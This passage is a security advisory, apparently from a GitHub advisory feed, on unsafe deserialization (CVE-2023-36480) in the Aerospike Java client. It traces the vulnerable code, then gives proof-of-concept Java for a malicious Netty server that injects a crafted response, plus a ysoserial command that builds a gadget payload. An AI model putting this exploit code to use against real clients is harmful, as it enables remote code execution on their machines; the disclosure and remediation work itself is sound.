    int generation,
    int expiration,
    boolean isOperation
)  {
    Map&lt;String,Object&gt; bins = new LinkedHashMap&lt;&gt;();

    for (int i = 0 ; i &lt; opCount; i++) {
        int opSize = Buffer.bytesToInt(dataBuffer, dataOffset);
        byte particleType = dataBuffer[dataOffset + 5];
        byte nameSize = dataBuffer[dataOffset + 7];
        String name = Buffer.utf8ToString(dataBuffer, dataOffset + 8, nameSize);
        dataOffset += 4 + 4 + nameSize;

        int particleBytesSize = opSize - (4 + nameSize);
        Object value = Buffer.bytesToParticle(particleType, dataBuffer, dataOffset, particleBytesSize);
</code></pre>
<p><code>Buffer.bytesToParticle</code> converts the remaining bytes in the data buffer depending on the <code>particleType</code> field. We're interested in the <code>JBLOB</code> case:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53"><code>client/src/com/aerospike/client/command/Buffer.java:53</code></a></p>
<pre><code class="language-java">public static Object bytesToParticle(int type, byte[] buf, int offset, int len)
    throws AerospikeException {
        switch (type) {
            // --snip--
            case ParticleType.JBLOB:
                return Buffer.bytesToObject(buf, offset, len);
</code></pre>
<p>In <code>bytesToObject</code>, the deserialization of an object from the message bytes happens:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L300"><code>client/src/com/aerospike/client/command/Buffer.java:300</code></a></p>
<pre><code class="language-java">public static Object bytesToObject(byte[] buf, int offset, int length) {
    // --snip--
    try (ByteArrayInputStream bastream = new ByteArrayInputStream(buf, offset, length)) {
        try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {
            return oistream.readObject();
        }
    }
    // --snip--
}
</code></pre>
<p>NOTE: Take into account that there exists a similar sink, that can be reached in a similar way, in <code>Unpacker.unpackBlock</code>:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227"><code>client/src/com/aerospike/client/util/Unpacker.java:227</code></a></p>
<pre><code class="language-java">private T unpackBlob(int count) throws IOException, ClassNotFoundException {
    // --snip--
    case ParticleType.JBLOB:
        // --snip--
        try (ByteArrayInputStream bastream = new ByteArrayInputStream(buffer, offset, count)) {
            try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {
                val = getJavaBlob(oistream.readObject());
            }
        }
</code></pre>
<p>This vulnerability was discovered with the help of <a href="https://codeql.github.com/">CodeQL</a>.</p>
<h4 id="impact">Impact</h4>
<p>This issue may lead to Remote Code Execution (RCE) in the Java client.</p>
<h4 id="remediation">Remediation</h4>
<p>Avoid deserialization of untrusted data if at all possible. If the architecture permits it then use other formats instead of serialized objects, for example JSON or XML.  However, these formats should not be deserialized into complex objects because this provides further opportunities for attack. For example, XML-based deserialization attacks are possible through libraries such as XStream and XmlDecoder.</p>
<p>Alternatively, a tightly controlled whitelist can limit the vulnerability of code but be aware of the existence of so-called Bypass Gadgets, which can circumvent such protection measures.</p>
<h4 id="resources">Resources</h4>
<p>To exploit this vulnerability, a malicious Aerospike server is needed. For the sake of simplicity, we implemented a mock server with hardcoded responses, with the only goal of reaching the vulnerable code of the client. To be able to easily reproduce this, we used the client's examples with the <code>-netty</code> flag, specifically the <code>AsyncPutGet</code>, which uses an <code>AsyncRead</code>. The examples point to <code>localhost:3000</code> by default, so we set up a simple Netty TCP server listening on that port, which replicates responses previously intercepted from a real Aerospike server and returns them to the client, until the <code>AsyncRead</code> command happens. Then, our server injects the malicious response:</p>
<pre><code class="language-java">public class AttackChannelHandler extends SimpleChannelInboundHandler&lt;String&gt; {

    @Override
    protected void channelRead0(ChannelHandlerContext ctx, String s) throws Exception {
        // --snip--
        if (s.getBytes()[7] == 0x44) {
            AttackMessage m = new AttackMessage(
                    Files.readAllBytes(Paths.get("location/of/deserialization/payload.bin")));
            ctx.channel().writeAndFlush(m);
            return;
        }
        // --snip--
    }
}
</code></pre>
<p><code>AttackMessage</code> is a class that hardcodes the necessary data to deliver the payload:</p>
<pre><code class="language-java">public class AttackMessage {

    private byte resultCode = 0;
    private int generation = 2;
    private int expiration = 417523457;
    private short fieldCount = 0;
    private short opCount = 1;
    private byte particleType = 7;
    private String name = "putgetbin";
    private byte[] payload;

    public AttackMessage(byte[] payload) {
        this.payload = payload;
    }

    // --snip-- (getters)

    public int[] getSize() {
        int size = 30 + name.length() + payload.length;
        int low = (byte) (size &amp; 0xFF);
        int high = (byte) (size &gt;&gt; 8) &amp; 0xFF;
        return new int[] {high, low};
    }

    public int getOpSize() {
        return payload.length + 4 + name.length();
    }

    public byte[] getPayload() {
        return payload;
    }
}
</code></pre>
<p>And it's finally encoded and delivered to the client through the network using a <code>MessageToByteEncoder</code> from Netty:</p>
<pre><code class="language-java">public class AttackMessageEncoder extends MessageToByteEncoder&lt;AttackMessage&gt; {

    @Override
    protected void encode(ChannelHandlerContext ctx, AttackMessage msg, ByteBuf out)
            throws Exception {
        // header
        out.writeBytes(new byte[] {0x02, 0x03, 0x00, 0x00, 0x00, 0x00});
        int[] length = msg.getSize();
        out.writeByte(length[0]);
        out.writeByte(length[1]);

        out.writeBytes(new byte[] {0x16, 0x00, 0x00, 0x00, 0x00});
        out.writeByte(msg.getResultCode());
        out.writeInt(msg.getGeneration());
        out.writeInt(msg.getExpiration());

        out.writeBytes(new byte[] {0x00, 0x00, 0x00, 0x00});
        out.writeShort(msg.getFieldCount());
        out.writeShort(msg.getOpCount());
        out.writeInt(msg.getOpSize());

        out.writeByte(0x01);
        out.writeByte(msg.getParticleType());

        out.writeByte(0x00);
        out.writeByte(msg.getName().length());
        out.writeCharSequence(msg.getName(), Charset.defaultCharset());
        out.writeBytes(msg.getPayload());
    }

}
</code></pre>
<p>The specific deserialization payload that needs to be used depends on the deserialization gadgets available in the classpath of the application using the Aerospike client. Again, for simplicity, we assumed the victim application uses Apache Commons Collections 4.0, which contains a well-known deserialization gadget:</p>
<pre><code class="language-xml">&lt;dependency&gt;
  &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
  &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
  &lt;version&gt;4.0&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>In which case, the malicious payload file could be generated using <a href="https://github.com/frohoff/ysoserial"><code>ysoserial</code></a> as follows:</p>
<pre><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 '/System/Applications/Calculator.app/Contents/MacOS/Calculator' &gt; payload.bin
</code></pre>
<h2 id="github-security-advisories">GitHub Security Advisories</h2>
<p>We recommend you create a private <a href="https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory">GitHub Security Advisory</a> for this finding. This also allows you to invite the GHSL team to collaborate and further discuss this finding in private before it is <a href="https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory">published</a>.</p>
<h2 id="credit">Credit</h2>
<p>This issue was discovered and reported by the GitHub CodeQL team members <a href="https://github.com/atorralba">@atorralba (Tony Torralba)</a> and <a href="https://github.com/joefarebrother">@joefarebrother (Joseph Farebrother)</a>.</p>
<h2 id="contact">Contact</h2>
<p>You can contact the GHSL team at <code>securitylab@github.com</code>, please include a reference to <code>GHSL-2023-044</code> in any communication regarding this issue.</p>
<h2 id="disclosure-policy">Disclosure Policy</h2>
<p>This report is subject to our <a href="https://securitylab.github.com/advisories#policy">coordinated disclosure policy</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aerospike/aerospike-client-java/security/advisories/GHSA-jj95-55cr-9597">https://github.com/aerospike/aerospike-client-java/security/advisories/GHSA-jj95-55cr-9597</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900">https://github.com/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36480">https://nvd.nist.gov/vuln/detail/CVE-2023-36480</a></li>
<li><a href="https://support.aerospike.com/s/article/CVE-2023-36480-Aerospike-Java-Client-vulnerable-to-unsafe-deserialization-of-server-responses">https://support.aerospike.com/s/article/CVE-2023-36480-Aerospike-Java-Client-vulnerable-to-unsafe-deserialization-of-server-responses</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/02bf28e62fb186f004c82c87b219db2fc5b8262a">https://github.com/aerospike/aerospike-client-java/commit/02bf28e62fb186f004c82c87b219db2fc5b8262a</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/51c65e32837da29435161a2d9c09bbdc2071ecae">https://github.com/aerospike/aerospike-client-java/commit/51c65e32837da29435161a2d9c09bbdc2071ecae</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/66aafb4cd743cf53baffaeaf69b035f51d2e2e36">https://github.com/aerospike/aerospike-client-java/commit/66aafb4cd743cf53baffaeaf69b035f51d2e2e36</a></li>
<li><a href="https://github.com/advisories/GHSA-jj95-55cr-9597">https://github.com/advisories/GHSA-jj95-55cr-9597</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jj95-55cr-9597</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-08-03T19:45:39.000Z</published>
    </entry>
</feed>